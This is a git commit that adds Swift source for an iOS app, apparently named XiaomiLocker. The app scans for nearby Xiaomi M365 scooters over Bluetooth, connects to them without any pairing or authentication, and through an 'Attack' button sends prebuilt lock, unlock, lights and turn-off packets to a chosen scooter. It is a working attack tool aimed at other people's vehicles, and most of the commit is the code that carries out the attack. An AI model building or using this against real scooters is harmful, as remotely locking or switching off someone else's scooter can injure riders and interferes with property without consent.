cc78be361023f6e4910d85a7b7034a35a7f31708
Oscar Blanco <oscarbc@me.com>
2019-02-14 22:57:55 +0100

    second try

---
+++ XiaomiLocker/Message.swift
@@ -0,0 +1,85 @@
+//
+//  Message.swift
+//  XiaomiLocker
+//
+//  Created by Oscar Blanco on 13/02/2019.
+//  Copyright © 2019 Oscar Blanco. All rights reserved.
+//
+
+import Foundation
+
+enum MessageCommands: UInt8 {
+    case MASTER_TO_M365 = 0x20
+    case MASTER_TO_BATTERY = 0x22
+    case READ = 0x01
+    case WRITE = 0x03
+}
+
+class Message {
+    private var message = [UInt8]()
+    
+    private var direction: UInt8 = 0
+    private var rw: UInt8 = 0
+    private var position: UInt8 = 0
+    private var payload = [UInt8]()
+    private var checksum: Int = 0
+    
+    
+    func setDirection(newDirection: MessageCommands) -> Message {
+        direction = newDirection.rawValue
+        checksum += Int(direction)
+        return self
+    }
+    
+    func setReadOrWrite(readOrWrite: MessageCommands) -> Message { // read or write
+        rw = readOrWrite.rawValue
+        checksum += Int(rw)
+        return self
+    }
+    
+    func setPosition(pos: UInt8) -> Message {
+        position = pos
+        checksum += Int(position)
+        return self
+    }
+    
+    func setPayload(singleByteToSend: UInt8) -> Message {
+        payload.append(singleByteToSend)
+        checksum += 3
+        checksum += Int(singleByteToSend)
+        return self
+    }
+    
+    private func setupHeaders() {
+        message.append(0x55)
+        message.append(0xAA)
+    }
+    
+    private func setupBody() {
+        message.append(UInt8(payload.count + 2))
+        message.append(direction)
+        message.append(rw)
+        message.append(position)
+        
+        for byte in payload {
+            message.append(byte)
+        }
+    }
+    
+    private func calculateChecksum() {
+        checksum = checksum ^ 0xffff
+        message.append(UInt8(checksum & 0xff))
+        message.append(UInt8(checksum >> 8))
+    }
+    
+    private func buildMessage() -> [UInt8] {
+        return message
+    }
+    
+    func build() -> [UInt8] {
+        setupHeaders()
+        setupBody()
+        calculateChecksum()
+        return buildMessage()
+    }
+}
---
+++ XiaomiLocker/ScanTableViewController.swift
@@ -0,0 +1,266 @@
+//
+//  ScanTableViewController.swift
+//  XiaomiLocker
+//
+//  Created by Oscar Blanco on 13/02/2019.
+//  Copyright © 2019 Oscar Blanco. All rights reserved.
+//
+
+import UIKit
+import CoreBluetooth
+
+struct ScooterContainer: Hashable {
+    let scooter: CBPeripheral
+    let lastRSSI: NSNumber
+    let isConnectable: Bool
+    
+    var hashValue: Int { return scooter.hashValue }
+    
+    static func == (lhs: ScooterContainer, rhs: ScooterContainer) -> Bool {
+        return lhs.scooter == rhs.scooter
+    }
+}
+
+//  PAYLOADS
+let LockArray:[UInt8] = Message()
+    .setDirection(newDirection: .MASTER_TO_M365)
+    .setReadOrWrite(readOrWrite: .WRITE)
+    .setPosition(pos: 0x71)
+    .setPayload(singleByteToSend: 0x0001)
+    .build()
+
+let UnlockArray:[UInt8] = Message()
+    .setDirection(newDirection: .MASTER_TO_M365)
+    .setReadOrWrite(readOrWrite: .WRITE)
+    .setPosition(pos: 0x70)
+    .setPayload(singleByteToSend: 0x0001)
+    .build()
+
+let TurnOnLightsArray:[UInt8] = Message()
+    .setDirection(newDirection: .MASTER_TO_M365)
+    .setReadOrWrite(readOrWrite: .WRITE)
+    .setPosition(pos: 0x7d)
+    .setPayload(singleByteToSend: 0x0001)
+    .build()
+
+let TurnOffArray:[UInt8] = Message()
+    .setDirection(newDirection: .MASTER_TO_M365)
+    .setReadOrWrite(readOrWrite: .WRITE)
+    .setPosition(pos: 0x79)
+    .setPayload(singleByteToSend: 0x01)
+    .build()
+
+class ScanTableViewController: UITableViewController {
+    
+//  CONSTANTS
+    private let characteristicWrite = "6e400002-b5a3-f393-e0a9-e50e24dcca9e";
+    private var payloads = [
+        "Lock": Data(bytes: LockArray),
+        "Unlock": Data(bytes: UnlockArray),
+        "TurnOnLights": Data(bytes: TurnOnLightsArray),
+        "TurnOff": Data(bytes: TurnOffArray)
+    ]
+    
+//  APP
+    @IBOutlet weak var payloadBarButton: UIBarButtonItem!
+    @IBOutlet weak var scanBarButton: UIBarButtonItem!
+    @IBOutlet weak var filterBarButton: UIBarButtonItem!
+    @IBOutlet weak var cleanBarButton: UIBarButtonItem!
+    @IBOutlet weak var statusBarButton: UIBarButtonItem!
+    @IBOutlet weak var attackBarButton: UIBarButtonItem!
+    
+    private var centralManager: CBCentralManager!
+    private var scooters = Set<ScooterContainer>()
+    private var selectedScooter: ScooterContainer?
+    private var filtersEnabled = true
+    private var selectedPayload = "Lock"
+    private var selectedCharacteristic: CBCharacteristic?
+    
+    required init?(coder aDecoder: NSCoder) {
+        super.init(coder: aDecoder)
+        centralManager = CBCentralManager(delegate: self, queue: DispatchQueue.main)
+    }
+
+    override func viewDidLoad() {
+        super.viewDidLoad()
+        
+        payloadBarButton.title = selectedPayload
+        scanBarButton.title = "Scan"
+        filterBarButton.title = "Filters: ON"
+        cleanBarButton.title = "Clean"
+        statusBarButton.title = "Disconnected"
+        attackBarButton.title = "Attack"
+    }
+
+    // MARK: - Table view data source
+
+    override func numberOfSections(in tableView: UITableView) -> Int {
+        return 1
+    }
+
+    override func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
+        return scooters.count
+    }
+
+    override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
+        let cell = tableView.dequeueReusableCell(withIdentifier: "scooterCell", for: indexPath)
+        
+        let scooterContainer = Array(scooters)[indexPath.row]
+        
+        cell.textLabel?.text = scooterContainer.scooter.name
+        cell.detailTextLabel?.text = "\(scooterContainer.lastRSSI)dB - Connectable: \(scooterContainer.isConnectable)"
+        
+        return cell
+    }
+    
+    override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
+        selectedScooter = Array(scooters)[indexPath.row]
+        statusBarButton.title = "Connecting..."
+        centralManager.connect((selectedScooter?.scooter)!, options: nil)
+        
+    }
+
+    private func startScanning() {
+        self.title = "Scanning..."
+        self.scanBarButton.title = "Stop"
+        
+        centralManager?.scanForPeripherals(withServices: nil, options: [CBCentralManagerScanOptionAllowDuplicatesKey: true])
+    }
+    
+    private func setPayload(alert: UIAlertAction!) {
+        selectedPayload = alert.title!
+        self.payloadBarButton.title = selectedPayload
+    }
+    
+    @IBAction func scanBarButtonAction(_ sender: Any) {
+        if centralManager.isScanning{
+            centralManager?.stopScan()
+            self.title = "\(scooters.count) Devices Found"
+            self.scanBarButton.title = "Scan"
+        }else{
+            startScanning()
+        }
+    }
+    
+    @IBAction func filterBarButtonAction(_ sender: Any) {
+        filtersEnabled = !filtersEnabled
+        
+        scooters.removeAll()
+        tableView.reloadData()
+        startScanning()
+        
+        if filtersEnabled {
+            filterBarButton.title = "Filters: ON"
+        } else {
+            filterBarButton.title = "Filters: OFF"
+        }
+    }
+    
+    @IBAction func payloadBarButtonAction(_ sender: Any) {
+        let alert = UIAlertController(title: "Payload", message: "", preferredStyle: .alert)
+        
+        for (name, _) in payloads {
+             alert.addAction(UIAlertAction(title: name, style: .default, handler: setPayload))
+        }
+
+        self.present(alert, animated: true, completion: nil)
+    }
+    
+    @IBAction func cleanBarButtonAction(_ sender: Any) {
+        statusBarButton.title = "Disconnected"
+        scooters.removeAll()
+        selectedScooter = nil
+        tableView.reloadData()
+        self.title = "\(scooters.count) Devices Found"
+    }
+    
+    @IBAction func attackBarButtonAction(_ sender: Any) {
+        if let characteristic = selectedCharacteristic {
+            selectedScooter?.scooter.writeValue(payloads[selectedPayload]!, for: characteristic, type: .withoutResponse)
+        }
+    }
+    
+    
+}
+
+extension ScanTableViewController: CBCentralManagerDelegate {
+    func centralManagerDidUpdateState(_ central: CBCentralManager){
+        if (central.state == .poweredOn){
+            scanBarButton.isEnabled = true
+            startScanning()
+        }else{
+            self.title = "Bluetooth Disabled"
+            scanBarButton.isEnabled = false
+            scooters.removeAll()
+            tableView.reloadData()
+            
+            let alertView = UIAlertController(title: "Bluetooth Unavailable", message: "Please turn bluetooth on", preferredStyle: .alert)
+            let action = UIAlertAction(title: "OK", style: .default, handler: { (alert) in })
+            alertView.addAction(action)
+            self.present(alertView, animated: true, completion: nil)
+
+        }
+    }
+    
+    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral, advertisementData: [String : Any], rssi RSSI: NSNumber){
+        let isConnectable = advertisementData["kCBAdvDataIsConnectable"] as! Bool
+        
+        if let services = peripheral.services {
+            for service in services {
+                peripheral.discoverCharacteristics(nil, for: service)
+            }
+        }
+        
+        
+        var isScooter = true
+        if filtersEnabled {
+            
+            if let name = peripheral.name {
+                isScooter = name.contains("MIScooter")
+            } else {
+                isScooter = false
+            }
+        }
+        
+        if isScooter {
+            let scooterContainer = ScooterContainer(scooter: peripheral, lastRSSI: RSSI, isConnectable: isConnectable)
+            scooters.insert(scooterContainer)
+            tableView.reloadData()
+        }
+    }
+    
+    func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
+        statusBarButton.title = "Connected"
+        peripheral.delegate = self
+        peripheral.discoverServices(nil)
+    }
+    
+    func centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {
+        let alert = UIAlertController(title: "Could not connect", message: self.selectedScooter?.scooter.name, preferredStyle: .alert)
+        let action = UIAlertAction(title: "OK", style: .default, handler: { (alert) in })
+        alert.addAction(action)
+        
+        self.present(alert, animated: true, completion: nil)
+    }
+
+}
+
+extension ScanTableViewController: CBPeripheralDelegate {
+    func peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {
+        guard let services = peripheral.services else { return }
+        for service in services {
+            peripheral.discoverCharacteristics(nil, for: service)
+        }
+    }
+    
+    func peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {
+        guard let characteristics = service.characteristics else { return }
+        
+        for characteristic in characteristics {
+            print(characteristic)
+            if characteristic.uuid.uuidString.caseInsensitiveCompare(characteristicWrite) == .orderedSame {
+                self.selectedCharacteristic = characteristic
+            }
+        }
+    }
+}
